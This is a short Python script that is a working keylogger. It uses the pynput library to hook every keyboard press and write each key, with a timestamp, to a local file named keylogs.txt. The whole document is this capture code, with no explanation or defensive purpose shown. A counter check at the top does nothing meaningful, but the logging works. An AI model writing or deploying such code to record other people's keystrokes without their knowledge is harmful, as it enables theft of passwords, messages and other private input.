from pynput.keyboard import Key, Listener
import logging
global count
count = 0
if count < 6:
    count = count + 1
    log_dir = ""
    logging.basicConfig(filename=(log_dir + "keylogs.txt"),
       level=logging.DEBUG, format='%(asctime)s: %(message)s')
    def on_press (key):
        logging.info(str(key))
    with Listener(on_press=on_press) as listener:
        listener.join()
